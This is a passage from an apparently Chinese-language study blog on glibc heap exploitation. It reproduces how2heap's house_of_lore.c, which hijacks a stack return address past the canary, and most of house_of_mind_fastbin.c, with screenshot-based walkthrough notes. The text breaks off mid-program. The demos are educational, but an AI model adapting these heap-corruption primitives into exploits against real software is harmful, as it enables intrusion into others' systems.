  <span class="token class-name">intptr_t</span><span class="token operator">*</span> stack_buffer_1<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
  <span class="token class-name">intptr_t</span><span class="token operator">*</span> stack_buffer_2<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"\nWelcome to the House of Lore\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"This is a revisited version that bypass also the hardening check introduced by glibc malloc\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"This is tested against Ubuntu 16.04.6 - 64bit - glibc-2.23\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Allocating the victim chunk\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token class-name">intptr_t</span> <span class="token operator">*</span>victim <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Allocated the first small chunk on the heap at %p\n"</span><span class="token punctuation">,</span> victim<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token comment">// victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk</span>
  <span class="token class-name">intptr_t</span> <span class="token operator">*</span>victim_chunk <span class="token operator">=</span> victim<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">;</span>

  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"stack_buffer_1 at %p\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span>stack_buffer_1<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"stack_buffer_2 at %p\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span>stack_buffer_2<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Create a fake chunk on the stack\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted"</span>
         <span class="token string">"in second to the last malloc, which putting stack address on smallbin list\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  stack_buffer_1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  stack_buffer_1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  stack_buffer_1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> victim_chunk<span class="token punctuation">;</span>

  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 "</span>
         <span class="token string">"in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake "</span>
         <span class="token string">"chunk on stack"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  stack_buffer_1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">intptr_t</span><span class="token operator">*</span><span class="token punctuation">)</span>stack_buffer_2<span class="token punctuation">;</span>
  stack_buffer_2<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">intptr_t</span><span class="token operator">*</span><span class="token punctuation">)</span>stack_buffer_1<span class="token punctuation">;</span>
  
  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Allocating another large chunk in order to avoid consolidating the top chunk with"</span>
         <span class="token string">"the small one during the free()\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">void</span> <span class="token operator">*</span>p5 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Allocated the large chunk on the heap at %p\n"</span><span class="token punctuation">,</span> p5<span class="token punctuation">)</span><span class="token punctuation">;</span>


  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Freeing the chunk %p, it will be inserted in the unsorted bin\n"</span><span class="token punctuation">,</span> victim<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">free</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span>victim<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"\nIn the unsorted bin the victim's fwd and bk pointers are nil\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"victim->fwd: %p\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>victim<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"victim->bk: %p\n\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>victim<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Now performing a malloc that can't be handled by the UnsortedBin, nor the small bin\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"This means that the chunk %p will be inserted in front of the SmallBin\n"</span><span class="token punctuation">,</span> victim<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">void</span> <span class="token operator">*</span>p2 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">1200</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"The chunk that can't be handled by the unsorted bin, nor the SmallBin has been allocated to %p\n"</span><span class="token punctuation">,</span> p2<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"The victim chunk has been sorted and its fwd and bk pointers updated\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"victim->fwd: %p\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>victim<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"victim->bk: %p\n\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>victim<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token comment">//------------VULNERABILITY-----------</span>

  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Now emulating a vulnerability that can overwrite the victim->bk pointer\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  victim<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">intptr_t</span><span class="token punctuation">)</span>stack_buffer_1<span class="token punctuation">;</span> <span class="token comment">// victim->bk is pointing to stack</span>

  <span class="token comment">//------------------------------------</span>

  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Now allocating a chunk with size equal to the first one freed\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"This should return the overwritten victim chunk and set the bin->bk to the injected victim->bk pointer\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">void</span> <span class="token operator">*</span>p3 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"This last malloc should trick the glibc malloc to return a chunk at the position injected in bin->bk\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">char</span> <span class="token operator">*</span>p4 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"p4 = malloc(0x100)\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"\nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %p\n"</span><span class="token punctuation">,</span>
         stack_buffer_2<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"\np4 is %p and should be on the stack!\n"</span><span class="token punctuation">,</span> p4<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// this chunk will be allocated on stack</span>
  <span class="token class-name">intptr_t</span> sc <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">intptr_t</span><span class="token punctuation">)</span>jackpot<span class="token punctuation">;</span> <span class="token comment">// Emulating our in-memory shellcode</span>
  <span class="token keyword">long</span> offset <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span><span class="token function">__builtin_frame_address</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span>p4<span class="token punctuation">;</span>
  <span class="token function">memcpy</span><span class="token punctuation">(</span><span class="token punctuation">(</span>p4<span class="token operator">+</span>offset<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>sc<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// This bypasses stack-smash detection since it jumps over the canary</span>

  <span class="token comment">// sanity check</span>
  <span class="token function">assert</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span><span class="token function">__builtin_return_address</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span>jackpot<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>初始化两个fake_chunk:</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220528152815675.png"></p>
<p>创建一个chunk victim：</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220528152640801.png"></p>
<p>修改fake_chunk1的fd指针，指向victim</p>
<p>修改fake_chunk1的bk指针，指向fake_chunk2</p>
<p>修改fake_chunk2的fd指针，指向fake_chunk1</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220528152936864.png"></p>
<p>申请chunk p5：</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220528153031278.png"></p>
<p>释放chunk victim：</p>
<p>进入unsorted bin</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220528153139837.png"></p>
<p>申请chunk p2：</p>
<p>此时原本在unsorted bin中的victim进入small bin中</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220528153303384.png"></p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220528153408247.png"></p>
<p>此时victim的内存布局：</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220528153542272.png"></p>
<p>接下来demo将修改victim的bk指针指向fake_chunk1：（<strong>关键</strong>）</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220528153726759.png"></p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220528153758965.png"></p>
<p>此时的victim的bk指针指向fake_chunk1,再指向fake_chunk2</p>
<p>再次申请一个chunk p3：</p>
<p>此时会将small bin头部的victim申请出来</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220528153952543.png"></p>
<p>再申请一个chunk p4：</p>
<p>此时会将fake_chunk1申请出来</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220528205341579.png"></p>
<p>&#x3D;&#x3D;&#x3D;》<strong>实现任意地址写</strong></p>
<h4 id="总结：-1"><a href="#总结：-1" class="headerlink" title="总结："></a>总结：</h4><p>存在于small bin不为空时的漏洞，通过修改头chunk的bk指针以绕过检查实现控制任意地址</p>
<h3 id="house-of-mind-fastbin-c"><a href="#house-of-mind-fastbin-c" class="headerlink" title="house_of_mind_fastbin.c"></a>house_of_mind_fastbin.c</h3><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdint.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;assert.h></span></span>

<span class="token comment">/*

House of Mind - Fastbin Variant
==========================

This attack is similar to the original 'House of Mind' in that it uses
a fake non-main arena in order to write to a new location. This
uses the fastbin for a WRITE-WHERE primitive in the 'fastbin'
variant of the original attack though. The original write for this
can be found at https://dl.packetstormsecurity.net/papers/attack/MallocMaleficarum.txt with a more recent post (by me) at https://maxwelldulin.com/BlogPost?post=2257705984. 

By being able to allocate an arbitrary amount of chunks, a single byte
overwrite on a chunk size and a memory leak, we can control a super
powerful primitive. 

This could be used in order to write a freed pointer to an arbitrary
location (which seems more useful). Or, this could be used as a
write-large-value-WHERE primitive (similar to unsortedbin attack). 
 Both are interesting in their own right though but the first
option is the most powerful primitive, given the right setting.

Malloc chunks have a specified size and this size information
special metadata properties (prev_inuse, mmap chunk and non-main arena). 
The usage of non-main arenas is the focus of this exploit. For more information 
on this, read https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/. 

First, we need to understand HOW the non-main arena is known from a chunk.

This the 'heap_info' struct: 

struct _heap_info
&#123;
  mstate ar_ptr;           // Arena for this heap. &lt;--- Malloc State pointer
  struct _heap_info *prev; // Previous heap.
  size_t size;            // Current size in bytes.
  size_t mprotect_size;   // Size in bytes that has been mprotected
  char pad[-6 * SIZE_SZ &amp; MALLOC_ALIGN_MASK]; // Proper alignment
&#125; heap_info; 
- https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/arena.c#L48

The important thing to note is that the 'malloc_state' within
an arena is grabbed from the ar_ptr, which is the FIRST entry 
of this. Malloc_state == mstate == arena 

The main arena has a special pointer. However, non-main arenas (mstate)
are at the beginning of a heap section. They are grabbed with the 
following code below, where the user controls the 'ptr' in 'arena_for_chunk':

#define heap_for_ptr(ptr) \
  ((heap_info *) ((unsigned long) (ptr) &amp; ~(HEAP_MAX_SIZE - 1)))
#define arena_for_chunk(ptr) \
  (chunk_non_main_arena (ptr) ? heap_for_ptr (ptr)->ar_ptr : &amp;main_arena)
- https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/arena.c#L127

This macro takes the 'ptr' and subtracts a large value because the 
'heap_info' should be at the beginning of this heap section. Then, 
using this, it can find the 'arena' to use. 

The idea behind the attack is to use a fake arena to write pointers 
to locations where they should not go but abusing the 'arena_for_chunk' 
functionality when freeing a fastbin chunk.

This POC does the following things: 
- Finds a valid arena location for a non-main arena.
- Allocates enough heap chunks to get to the non-main arena location where 
  we can control the values of the arena data. 
- Creates a fake 'heap_info' in order to specify the 'ar_ptr' to be used as the arena later.
- Using this fake arena (ar_ptr), we can use the fastbin to write
  to an unexpected location of the 'ar_ptr' with a heap pointer. 

Requirements: 
- A heap leak in order to know where the fake 'heap_info' is located at.
	- Could be possible to avoid with special spraying techniques
- An unlimited amount of allocations
- A single byte overflow on the size of a chunk
	- NEEDS to be possible to put into the fastbin. 
	- So, either NO tcache or the tcache needs to be filled. 
- The location of the malloc state(ar_ptr) needs to have a value larger
  than the fastbin size being freed at malloc_state.system_mem otherwise
  the chunk will be assumed to be invalid.
	- This can be manually inserted or CAREFULLY done by lining up
	  values in a proper way. 
- The NEXT chunk, from the one that is being freed, must be a valid size
(again, greater than 0x20 and less than malloc_state.system_mem)


Random perks:
- Can be done MULTIPLE times at the location, with different sized fastbin
  chunks. 
- Does not brick malloc, unlike the unsorted bin attack. 
- Only has three requirements: Infinite allocations, single byte buffer overflowand a heap memory leak. 



************************************
Written up by Maxwell Dulin (Strikeout) 
************************************
*/</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"House of Mind - Fastbin Variant\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"=================================="</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"The goal of this technique is to create a fake arena\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"at an offset of HEAP_MAX_SIZE\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Then, we write to the fastbins when the chunk is freed\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"This creates a somewhat constrained WRITE-WHERE primitive\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token comment">// Values for the allocation information.	</span>
	<span class="token keyword">int</span> HEAP_MAX_SIZE <span class="token operator">=</span> <span class="token number">0x4000000</span><span class="token punctuation">;</span>
	<span class="token keyword">int</span> MAX_SIZE <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">128</span><span class="token operator">*</span><span class="token number">1024</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x100</span><span class="token punctuation">;</span> <span class="token comment">// MMap threshold: https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L635</span>

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Find initial location of the heap\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token comment">// The target location of our attack and the fake arena to use</span>
	<span class="token class-name">uint8_t</span><span class="token operator">*</span> fake_arena <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
	<span class="token class-name">uint8_t</span><span class="token operator">*</span> target_loc <span class="token operator">=</span> fake_arena <span class="token operator">+</span> <span class="token number">0x28</span><span class="token punctuation">;</span>

	<span class="token class-name">uint8_t</span><span class="token operator">*</span> target_chunk <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">uint8_t</span><span class="token operator">*</span><span class="token punctuation">)</span> fake_arena <span class="token operator">-</span> <span class="token number">0x10</span><span class="token punctuation">;</span>

	<span class="token comment">/*
	Prepare a valid 'malloc_state' (arena) 'system_mem' 
	to store a fastbin. This is important because the size
	of a chunk is validated for being too small or too large
	via the 'system_mem' of the 'malloc_state'. This just needs
	to be a value larger than our fastbin chunk.
	*/</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Set 'system_mem' (offset 0x880) for fake arena\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	fake_arena<span class="token punctuation">[</span><span class="token number">0x880</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xFF</span><span class="token punctuation">;</span>
	fake_arena<span class="token punctuation">[</span><span class="token number">0x881</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xFF</span><span class="token punctuation">;</span> 
	fake_arena<span class="token punctuation">[</span><span class="token number">0x882</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xFF</span><span class="token punctuation">;</span> 

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Target Memory Address for overwrite: %p\n"</span><span class="token punctuation">,</span> target_loc<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Must set data at HEAP_MAX_SIZE (0x%x) offset\n"</span><span class="token punctuation">,</span> HEAP_MAX_SIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">// Calculate the location of our fake arena</span>
	<span class="token class-name">uint64_t</span> new_arena_value <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token punctuation">)</span> target_chunk<span class="token punctuation">)</span> <span class="token operator">+</span> HEAP_MAX_SIZE<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token operator">~</span><span class="token punctuation">(</span>HEAP_MAX_SIZE <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token class-name">uint64_t</span><span class="token operator">*</span> fake_heap_info <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token operator">*</span><span class="token punctuation">)</span> new_arena_value<span class="token punctuation">;</span>

	<span class="token class-name">uint64_t</span><span class="token operator">*</span> user_mem <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>MAX_SIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Fake Heap Info struct location: %p\n"</span><span class="token punctuation">,</span> fake_heap_info<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Allocate until we reach a MAX_HEAP_SIZE offset\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>	

	<span class="token comment">/* 
	The fake arena must be at a particular offset on the heap.
	So, we allocate a bunch of chunks until our next chunk
	will be in the arena. This value was calculated above.
	*/</span>
	<span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token keyword">long</span><span class="token punctuation">)</span>user_mem <span class="token operator">&lt;</span> new_arena_value<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
		user_mem <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>MAX_SIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>

	<span class="token comment">// Use this later to trigger craziness</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Create fastbin sized chunk to be victim of attack\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token class-name">uint64_t</span><span class="token operator">*</span> fastbin_chunk <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Size of 0x60</span>
	<span class="token class-name">uint64_t</span><span class="token operator">*</span> chunk_ptr <span class="token operator">=</span> fastbin_chunk <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">;</span> <span class="token comment">// Point to chunk instead of mem</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Fastbin Chunk to overwrite: %p\n"</span><span class="token punctuation">,</span> fastbin_chunk<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">/*
	Create a FAKE malloc_state pointer for the heap_state
	This is the 'ar_ptr' of the 'heap_info' struct shown above. 
	This is the first entry in the 'heap_info' struct at offset 0x0
	 at the heap.

	We set this to the location where we want to write a value to.
	The location that gets written to depends on the fastbin chunk
	size being freed. This will be between an offset of 0x8 and 0x40
	bytes. For instance, a chunk with a size of 0x20 would be in the
	0th index of fastbinsY struct. When this is written to, we will
	write to an offset of 8 from the original value written.
	- https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L1686
	*/</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Setting 'ar_ptr' (our fake arena)  in heap_info struct to %p\n"</span><span class="token punctuation">,</span> fake_arena<span class="token punctuation">)</span><span class="token punctuation">;</span>
	fake_heap_info<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token punctuation">)</span> fake_arena<span class="token punctuation">;</span> <span class="token comment">// Setting the fake ar_ptr (arena)</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Target Write at %p prior to exploitation: 0x%x\n"</span><span class="token punctuation">,</span> target_loc<span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span>target_loc<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">/*
	Set the non-main arena bit on the size. 
	Additionally, we keep the size the same as the original
	allocation because there is a sanity check on the fastbin (when freeing)
	that the next chunk has a valid size. 

	When grabbing the non-main arena, it will use our choosen arena!
	From there, it will write to the fastbin because of the size of the
	chunk.

	///// Vulnerability! Overwriting the chunk size 
	*/</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Set non-main arena bit on the fastbin chunk\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"NOTE: This keeps the next chunk size valid because the actual chunk size was never changed\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	chunk_ptr<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x60</span> <span class="token operator">|</span> <span class="token number">0x4</span><span class="token punctuation">;</span> <span class="token comment">// Setting the non-main arena bit</span>

	<span class="token comment">//// End vulnerability </span>

	<span class="token comment">/*
	The offset being written to with the fastbin chunk address
	depends on the fastbin BEING used and the malloc_state itself. 
	In 2.23, the offset from the beginning of the malloc_state
	to the fastbinsY array is only 0x8. Then, fastbinsY[0x4] is an 
	additional byte offset of 0x20. In total, the writing offset
	from the arena location is 0x28 bytes.
	from the arena location to where the write actually occurs. 
	This is a similar concept to bk - 0x10 from the unsorted
	bin attack. 
	*/</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"When we free the fastbin chunk with the non-main arena bit\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
